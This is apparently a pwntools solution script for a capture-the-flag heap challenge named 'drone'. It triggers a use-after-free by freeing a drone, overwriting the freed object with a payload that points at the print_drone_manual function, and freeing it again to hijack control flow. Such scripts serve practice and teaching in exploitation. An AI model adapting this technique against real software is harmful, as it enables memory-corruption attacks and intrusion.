#!/usr/bin/env python3

# ruff: noqa: F403, F405

from pwn import *

elf = context.binary = ELF("./challenge/drone", checksec=False)
binary_path = elf.path


def start(argv=[], *a, **kw):
    nc = "nc localhost 1340"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [binary_path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        if args.GDB:
            return gdb.debug(args=args_, env=env, gdbscript=gdbscript)
        return process(args_, env=env, *a, **kw)


env = {}
gdbscript = """
# source ~/.gdbinit-gef-bata24.py
"""


def alloc_drone():
    io.sendlineafter(b"option:", b"1")


def free_drone(drone_id: int):
    io.sendlineafter(b"option:", b"2")
    io.sendlineafter(b"retire:", str(drone_id).encode())


def route_data(data: bytes):
    io.sendlineafter(b"option:", b"4")
    io.sendafter(b"data:", data)


io = start()

alloc_drone()
free_drone(1)
payload = flat(1, elf.bss(0xC00), elf.bss(0xC00), elf.sym["print_drone_manual"])
route_data(payload + b"\n")
free_drone(1)

io.interactive()
